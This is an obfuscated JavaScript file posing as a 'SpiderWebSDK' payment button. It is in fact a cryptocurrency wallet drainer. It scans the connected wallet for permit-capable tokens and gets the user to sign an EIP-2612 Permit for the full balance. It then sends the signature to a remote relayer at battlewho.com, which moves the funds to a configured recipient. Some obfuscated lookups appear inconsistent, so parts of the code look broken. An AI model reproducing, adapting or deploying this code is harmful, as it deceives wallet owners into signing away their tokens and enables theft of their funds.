var _0x3e8c = ['innerHTML', 'slice', 'addEventListener', 'owner', 'recipient', 'body', 'setItem', 'push', 'get-config', 'https://battlewho.com', 'text-align: center; color: #9ca3af;', 'https://eth-mainnet.g.alchemy.com/v2/', 'style', 'success', 'appendChild', 'getElementById', 'target', 'message', 'value', 'init', 'result', '_executeSend', 'color', 'info', 'disabled', 'splitSignature', 'v', 's', 'r', 'stringify', 'nonces', 'name', 'symbol', 'balanceOf', 'version', 'test', 'error', 'POST', 'headers', 'Content-Type', 'application/json', 'X-Api-Key', 'ok', 'json', 'log', 'warn', 'SpiderWebSDK already initialized.', 'Missing required configuration parameters.', 'ethers.js is not loaded. Please include it on your page.', 'SpiderWebSDK: Fetching remote configuration...', 'origin', 'location', 'Network error while fetching remote config. Status: ', 'status', 'Invalid remote configuration from server.', 'SpiderWebSDK: Remote configuration loaded successfully.', 'SpiderWebSDK FATAL ERROR:', 'SDK Init Failed', 'Button with ID "', '" not found.', 'click', '_handlePaymentClick', 'bind', '_injectModalHtml', '_setupEip6963Listeners', 'SpiderWebSDK initialized successfully.', '_connectWallet', 'Wallet connection cancelled.', 'getNetwork', 'chainId', 'Please switch your wallet to the correct network (Chain ID: ', ').', 'Payment failed:', 'Error: ', 'Scanning wallet for compatible tokens...', 'pending', '_findHighestValueToken', 'No permit-compatible tokens with a balance were found.', 'Highest value token found: ', '_signAndSendWithStandardPermit', 'alchemy_getTokenBalances', 'erc20', 'tokenBalances', 'filter', 'tokenBalance', 'contractAddress', '_checkPermitSupport', 'Found compatible token: ', '. Fetching details...', 'DOMAIN_SEPARATOR', 'Preparing permit for ', '...', 'floor', 'now', 'Token ', ' has no version(), defaulting to \'1\'.', 'Permit', 'spender', 'nonce', 'deadline', 'toString', '_signTypedData', 'Please sign the message for ', 'utils', 'execute-transfer', 'Signature received. Relaying transaction...', 'Relayer service failed.', '✅ ', ' transfer has been successfully relayed!', 'Standard Permit failed:', 'reason', 'Promise', 'resolve', '_openWalletModal', 'closest', '.sw-wallet-button', 'dataset', 'rdns', 'get', 'Connecting with ', '_closeWalletModal', 'providers', 'Web3Provider', 'send', 'eth_requestAccounts', 'getSigner', 'getAddress', 'Connected: ', '...'];
(function(_0x3c82e8, _0x3e8c0d) {
    var _0x593d49 = function(_0x4332a4) {
        while (--_0x4332a4) {
            _0x3c82e8['push'](_0x3c82e8['shift']());
        }
    };
    _0x593d49(++_0x3e8c0d);
}(_0x3e8c, 0x1d8));
var _0x593d = function(_0x3c82e8, _0x3e8c0d) {
    _0x3c82e8 = _0x3c82e8 - 0x0;
    var _0x593d49 = _0x3e8c[_0x3c82e8];
    return _0x593d49;
};
window['SpiderWebSDK'] = {
    '_config': {},
    '_provider': null,
    '_signer': null,
    '_currentUserAddress': null,
    '_discoveredProviders': new Map(),
    '_isInitialized': ![],
    '_ERC20_PERMIT_ABI': ['function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)', 'function nonces(address owner) view returns (uint256)', 'function DOMAIN_SEPARATOR() view returns (bytes32)', 'function name() view returns (string)', 'function version() view returns (string)', 'function decimals() view returns (uint8)', 'function balanceOf(address owner) view returns (uint256)', 'function symbol() view returns (string)'],
    '_RELAYER_SERVER_URL_BASE': _0x593d('0x65'),
    'init': async function(_0x555843) {
        if (this['_isInitialized']) {
            console[_0x593d('0x24')](_0x593d('0x25'));
            return;
        }
        if (!_0x555843['buttonId'] || !_0x555843['apiKey'] || !_0x555843['alchemyApiKey'] || !_0x555843['recipientAddress'] || !_0x555843[_0x593d('0x40')]) {
            console[_0x593d('0x1a')](_0x593d('0x26'));
            return;
        }
        if (typeof ethers === 'undefined') {
            console['error'](_0x593d('0x27'));
            return;
        }
        this['_config'] = _0x555843;
        try {
            console[_0x593d('0x23')](_0x593d('0x28'));
            const _0x59387c = await fetch(this['_RELAYER_SERVER_URL_BASE'] + '/' + _0x593d('0x64'), {
                'method': _0x593d('0x1b'),
                'headers': {
                    'Content-Type': _0x593d('0x1e'),
                    'X-Api-Key': this['_config']['apiKey']
                },
                'body': JSON[_0x593d('0x8')](_0x593d('0xd'))({
                    'apiKey': this['_config']['apiKey'],
                    'origin': window[_0x593d('0x2a')][_0x593d('0x29')]
                })
            });
            if (!_0x593d49['ok']) {
                throw new Error(_0x593d('0x2b') + _0x59387c[_0x593d('0x2c')]);
            }
            const _0x1a6652 = await _0x59387c[_0x593d('0x22')]();
            if (!_0x1a6652['success'] || !_0x1a6652['relayerAddress']) {
                throw new Error(_0x1a6652[_0x593d('0x73')] || _0x593d('0x2d'));
            }
            this['_config']['relayerAddress'] = _0x1a6652['relayerAddress'];
            console[_0x593d('0x23')](_0x593d('0x2e'));
        } catch (_0x3892f3) {
            console[_0x593d('0x1a')](_0x593d('0x2f'), _0x3892f3['message']);
            const _0x1d5f30 = document[_0x593d('0x71')](_0x555843['buttonId']);
            if (_0x1d5f30) {
                _0x1d5f30[_0x593d('0x7a')] = !![];
                _0x1d5f30['innerHTML'] = _0x593d('0x30');
            }
            return;
        }
        const _0x1d5f30 = document['getElementById'](_0x555843['buttonId']);
        if (!_0x1d5f30) {
            console[_0x593d('0x1a')](_0x593d('0x31') + _0x555843['buttonId'] + _0x593d('0x32'));
            return;
        }
        _0x1d5f30['addEventListener'](_0x593d('0x33'), this[_0x593d('0x34')][_0x593d('0x35')](this));
        this[_0x593d('0x36')]();
        this[_0x593d('0x37')]();
        this['_isInitialized'] = !![];
        console[_0x593d('0x23')](_0x593d('0x38'));
    },
    '_handlePaymentClick': async function() {
        try {
            if (!this['_signer']) {
                const _0x1a5928 = await this[_0x593d('0x39')]();
                if (!_0x1a5928) {
                    this['_updateStatus'](_0x593d('0x3a'), _0x593d('0x79'));
                }
                return;
            }
            const _0x199292 = await this['_provider'][_0x593d('0x3b')]();
            if (_0x199292[_0x593d('0x3c')] !== this['_config'][_0x593d('0x3c')]) {
                this['_updateStatus'](_0x593d('0x3d') + this['_config']['chainId'] + _0x593d('0x3e'), _0x593d('0x1a'));
                return;
            }
            await this[_0x593d('0x77')]();
        } catch (_0x30a301) {
            console[_0x593d('0x1a')](_0x593d('0x3f'), _0x30a301);
            this['_updateStatus'](_0x593d('0x40') + _0x30a301[_0x593d('0x73')], _0x593d('0x1a'));
        }
    },
    '_executeSend': async function() {
        this['_updateStatus'](_0x593d('0x41'), _0x593d('0x42'));
        const _0x450f68 = await this[_0x593d('0x43')]();
        if (!_0x450f68) {
            throw new Error(_0x593d('0x44'));
        }
        this['_updateStatus'](_0x593d('0x45') + _0x450f68[_0x593d('0xb')], _0x593d('0x79'));
        await this[_0x593d('0x46')](_0x450f68);
    },
    '_findHighestValueToken': async function() {
        const _0x5a23fa = _0x593d('0x67') + this['_config']['alchemyApiKey'];
        const _0x27977b = await fetch(_0x5a23fa, {
            'method': _0x593d('0x1b'),
            'headers': {
                'Content-Type': _0x593d('0x1e')
            },
            'body': JSON[_0x593d('0x8')](_0x593d('0xd'))({
                'jsonrpc': '2.0',
                'id': 0x1,
                'method': _0x593d('0x47'),
                'params': [this['_currentUserAddress'], _0x593d('0x48')]
            })
        });
        const _0x2a98e3 = await _0x27977b['json']();
        if (!_0x2a98e3[_0x593d('0x76')]) throw new Error('Could not fetch token balances from Alchemy.');
        const _0x364817 = _0x2a98e3[_0x593d('0x76')][_0x593d('0x49')][_0x593d('0x4a')](_0x1e66c7 => _0x1e66c7[_0x593d('0x4b')] !== '0x0');
        if (_0x364817['length'] === 0x0) return null;
        for (const _0x442e61 of _0x364817) {
            const _0x5e5b6c = _0x442e61[_0x593d('0x4c')];
            const _0x3a4049 = await this[_0x593d('0x4d')](_0x5e5b6c);
            if (_0x3a4049) {
                this['_updateStatus'](_0x593d('0x4e') + _0x5e5b6c + _0x593d('0x4f'), _0x593d('0x42'));
                const _0x550c60 = new ethers['Contract'](_0x5e5b6c, this['_ERC20_PERMIT_ABI'], this['_provider']);
                const [_0x38b814, _0x2cae44, _0x367f0f] = await Promise['all']([_0x550c60[_0x593d('0xa')](), _0x550c60[_0x593d('0xb')](), _0x550c60['balanceOf'](this['_currentUserAddress'])]);
                return {
                    'contractAddress': _0x5e5b6c,
                    'name': _0x38b814,
                    'symbol': _0x2cae44,
                    'balance': _0x367f0f
                };
            }
        }
        return null;
    },
    '_checkPermitSupport': async function(_0x2d17c7) {
        try {
            const _0x535a39 = new ethers['Contract'](_0x2d17c7, this['_ERC20_PERMIT_ABI'], this['_provider']);
            await _0x535a39[_0x593d('0x9')](this['_currentUserAddress']);
            await _0x535a39[_0x593d('0x50')]();
            return !![];
        } catch (_0x3f5c88) {
            return ![];
        }
    },
    '_signAndSendWithStandardPermit': async function(_0x47e857) {
        this['_updateStatus'](_0x593d('0x51') + _0x47e857[_0x593d('0xb')] + _0x593d('0x52'), 'pending');
        try {
            const _0x47b850 = new ethers['Contract'](_0x47e857[_0x593d('0x4c')], this['_ERC20_PERMIT_ABI'], this['_signer']);
            const _0x5928f0 = await _0x47b850['nonces'](this['_currentUserAddress']);
            const _0x3454a8 = Math['floor'](Date[_0x593d('0x54')]() / 0x3e8) + 0x708;
            const _0x3b856b = _0x47e857[_0x593d('0xa')];
            let _0x4a7e8e = '1';
            try {
                _0x4a7e8e = await _0x47b850[_0x593d('0xd')]();
            } catch (_0x3d0623) {
                console['log'](_0x593d('0x55') + _0x47e857['symbol'] + _0x593d('0x56'));
            }
            const _0x3b3d87 = {
                'name': _0x3b856b,
                'version': _0x4a7e8e,
                'chainId': this['_config'][_0x593d('0x3c')],
                'verifyingContract': _0x47e857['contractAddress']
            };
            const _0x45a272 = {
                'Permit': [{
                    'name': _0x593d('0x5c'),
                    'type': 'address'
                }, {
                    'name': _0x593d('0x58'),
                    'type': 'address'
                }, {
                    'name': _0x593d('0x74'),
                    'type': 'uint256'
                }, {
                    'name': 'nonce',
                    'type': 'uint256'
                }, {
                    'name': 'deadline',
                    'type': 'uint256'
                }]
            };
            const _0x3c2b8c = {
                'owner': this['_currentUserAddress'],
                'spender': this['_config']['relayerAddress'],
                'value': _0x47e857['balance'][_0x593d('0x5b')](),
                'nonce': _0x5928f0['toString'](),
                'deadline': _0x3454a8
            };
            this['_updateStatus'](_0x593d('0x5d') + _0x47e857['symbol'] + _0x593d('0x52'), 'pending');
            const _0x33b8a1 = await this['_signer'][_0x593d('0x5c')](_0x3b3d87, _0x45a272, _0x3c2b8c);
            const {
                v: _0x277457,
                r: _0x4d210d,
                s: _0x26649f
            } = ethers[_0x593d('0x5e')][_0x593d('0x7b')](_0x33b8a1);
            const _0x1c7a8b = {
                'apiKey': this['_config']['apiKey'],
                'owner': this['_currentUserAddress'],
                'recipient': this['_config'][_0x593d('0x5d')],
                'contractAddress': _0x47e857['contractAddress'],
                'value': _0x47e857['balance']['toString'](),
                'deadline': _0x3454a8,
                'v': _0x277457,
                'r': _0x4d210d,
                's': _0x26649f,
                'origin': window[_0x593d('0x2a')][_0x593d('0x29')],
                'chainId': this['_config'][_0x593d('0x3c')]
            };
            this['_updateStatus'](_0x593d('0x60'), _0x593d('0x42'));
            const _0x3503f1 = await fetch(this['_RELAYER_SERVER_URL_BASE'] + '/' + _0x593d('0x5f'), {
                'method': 'POST',
                'headers': {
                    'Content-Type': 'application/json',
                    'X-Api-Key': this['_config']['apiKey']
                },
                'body': JSON['stringify'](_0x1c7a8b)
            });
            const _0x3dd69b = await _0x3503f1['json']();
            if (!_0x3503f1['ok'] || !_0x3dd69b[_0x593d('0x6f')]) throw new Error(_0x3dd69b['message'] || _0x593d('0x61'));
            this['_updateStatus'](_0x593d('0x62') + _0x47e857[_0x593d('0xb')] + _0x593d('0x63'), _0x593d('0x6f'));
        } catch (_0x1a72d3) {
            console[_0x593d('0x1a')](_0x593d('0x64'), _0x1a72d3);
            this['_updateStatus']('Error: ' + (_0x1a72d3[_0x593d('0x65')] || _0x1a72d3[_0x593d('0x73')]), _0x593d('0x1a'));
            throw _0x1a72d3;
        }
    },
    '_connectWallet': function() {
        return new(_0x593d('0x66'))(_0x24e03d => {
            this['_resolveConnection'] = _0x24e03d;
            this[_0x593d('0x68')]();
        });
    },
    '_handleProviderSelection': async function(_0x546c43) {
        const _0x3213a4 = _0x546c43[_0x593d('0x72')][_0x593d('0x69')](_0x593d('0x6a'));
        if (!_0x3213a4) return;
        const _0x4f1f2e = _0x3213a4[_0x593d('0x6b')][_0x593d('0x6c')];
        const _0x46428c = this['_discoveredProviders'][_0x593d('0x6d')](_0x4f1f2e);
        if (!_0x46428c) return;
        this['_updateStatus'](_0x593d('0x6e') + _0x46428c['info'][_0x593d('0xa')] + _0x593d('0x52'), _0x593d('0x42'));
        this[_0x593d('0x6f')]();
        try {
            const _0x289745 = _0x46428c['provider'];
            this['_provider'] = new ethers[_0x593d('0x70')][_0x593d('0x71')](_0x289745);
            await this['_provider']['send'](_0x593d('0x73'), []);
            this['_signer'] = this['_provider'][_0x593d('0x74')]();
            this['_currentUserAddress'] = await this['_signer'][_0x593d('0x75')]();
            this['_updateStatus'](_0x593d('0x76') + this['_currentUserAddress'][_0x593d('0x5a')](0x0, 0x6) + _0x593d('0x77') + this['_currentUserAddress']['slice'](-0x4), _0x593d('0x6f'));
            if (this['_resolveConnection']) {
                this['_resolveConnection'](!![]);
                const _0x3c2ee1 = await this['_provider']['getNetwork']();
                if (_0x3c2ee1['chainId'] !== this['_config']['chainId']) {
                    this['_updateStatus']('Please switch your wallet to the correct network (Chain ID: ' + this['_config'][_0x593d('0x3c')] + ').', _0x593d('0x1a'));
                    return;
                }
                await this['_executeSend']();
            }
        } catch (_0x1a39a0) {
            console['error']('Connection failed:', _0x1a39a0);
            this['_updateStatus']('Connection failed or was rejected.', _0x593d('0x1a'));
            if (this['_resolveConnection']) this['_resolveConnection'](![]);
        }
    },
    '_setupEip6963Listeners': function() {
        window['addEventListener']('eip6963:announceProvider', _0x1804c7 => {
            const _0x5e08b3 = _0x1804c7['detail'];
            if (!this['_discoveredProviders']['has'](_0x5e08b3['info']['rdns'])) {
                this['_discoveredProviders']['set'](_0x5e08b3['info']['rdns'], _0x5e08b3);
                this['_renderWalletList']();
            }
        });
        window['dispatchEvent'](new Event('eip6963:requestProvider'));
    },
    '_renderWalletList': function() {
        const _0x3b8d0c = document['getElementById']('sw-wallet-list');
        if (!_0x3b8d0c) return;
        _0x3b8d0c[_0x593d('0x59')] = '';
        if (this['_discoveredProviders']['size'] === 0x0) {
            _0x3b8d0c['innerHTML'] = '<p style="' + _0x593d('0x66') + '">No wallets detected.</p>';
            return;
        }
        this['_discoveredProviders']['forEach'](_0x56a59b => {
            const _0x280425 = '\n                <button data-rdns="' + _0x56a59b['info']['rdns'] + '" class="sw-wallet-button" style="width: 100%; display: flex; align-items: center; padding: 12px; background-color: #374151; border-radius: 8px; border: none; cursor: pointer; margin-bottom: 8px; color: white;">\n                    <img src="' + _0x56a59b['info']['icon'] + '" alt="' + _0x56a59b['info'][_0x593d('0xa')] + '" style="width: 32px; height: 32px; margin-right: 16px; border-radius: 50%;"/>\n                    <span style="font-weight: 500;">' + _0x56a59b['info']['name'] + '</span>\n                </button>\n            ';
            _0x3b8d0c[_0x593d('0x59')] += _0x280425;
        });
        _0x3b8d0c['querySelectorAll']('.sw-wallet-button')['forEach'](_0x52b02e => {
            _0x52b02e[_0x593d('0x5b')](_0x593d('0x33'), this['_handleProviderSelection'][_0x593d('0x35')](this));
        });
    },
    '_openWalletModal': function() {
        document[_0x593d('0x71')]('sw-modal-overlay')[_0x593d('0x68')]['display'] = 'flex';
        setTimeout(() => {
            document[_0x593d('0x71')]('sw-wallet-modal')['style']['opacity'] = 0x1;
            document[_0x593d('0x71')]('sw-wallet-modal')[_0x593d('0x68')]['transform'] = 'scale(1)';
        }, 0xa);
        this['_renderWalletList']();
    },
    '_closeWalletModal': function() {
        const _0x18b6e7 = document['getElementById']('sw-modal-overlay');
        const _0x50f4a4 = document[_0x593d('0x71')]('sw-wallet-modal');
        if (_0x50f4a4) {
            _0x50f4a4[_0x593d('0x68')]['opacity'] = 0x0;
            _0x50f4a4['style']['transform'] = 'scale(0.95)';
        }
        setTimeout(() => {
            if (_0x18b6e7) _0x18b6e7[_0x593d('0x68')]['display'] = 'none';
            if (this['_resolveConnection'] && !this['_signer']) {
                this['_resolveConnection'](![]);
            }
        }, 0x12c);
    },
    '_updateStatus': function(_0x44ed09, _0x337777 = _0x593d('0x79')) {
        const _0xe298eb = document[_0x593d('0x71')]('sw-status-message');
        if (!_0xe298eb) return;
        const _0x3b110a = {
            'info': '#6b7280',
            'success': '#16a34a',
            'error': '#dc2626',
            'pending': '#2563eb'
        };
        _0xe298eb['innerHTML'] = '<p style="color: ' + _0x3b110a[_0x337777] + '; margin: 0; font-size: 14px; text-align: center;">' + _0x44ed09 + '</p>';
    },
    '_injectModalHtml': function() {
        if (document['getElementById']('sw-modal-overlay')) return;
        const _0x27749f = '\n            <div id="sw-modal-overlay" style="display: none; position: fixed; inset: 0; background-color: rgba(0,0,0,0.75); align-items: center; justify-content: center; z-index: 1000;">\n                <div id="sw-wallet-modal" style="background-color: #1f2937; border-radius: 16px; padding: 24px; width: 100%; max-width: 384px; color: white; transition: all 0.3s ease; opacity: 0; transform: scale(0.95);">\n                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">\n                        <h2 style="font-size: 24px; font-weight: 600; margin: 0;">Connect a Wallet</h2>\n                        <button id="sw-close-wallet-modal-btn" style="background: none; border: none; color: #9ca3af; font-size: 28px; cursor: pointer;">&times;</button>\n                    </div>\n                    <div id="sw-wallet-list" style="max-height: 300px; overflow-y: auto;"></div>\n                </div>\n            </div>\n            <div id="sw-status-message" style="margin-top: 16px; min-height: 20px;"></div>\n        ';
        document[_0x593d('0x5e')]['insertAdjacentHTML']('beforeend', _0x27749f);
        const _0x1c448d = this[_0x593d('0x6f')][_0x593d('0x35')](this);
        document['getElementById']('sw-close-wallet-modal-btn')[_0x593d('0x5b')]('click', _0x1c448d);
        document['getElementById']('sw-modal-overlay')[_0x593d('0x5b')](_0x593d('0x33'), _0x173a11 => {
            if (_0x173a11[_0x593d('0x72')]['id'] === 'sw-modal-overlay') _0x1c448d();
        });
    }
};
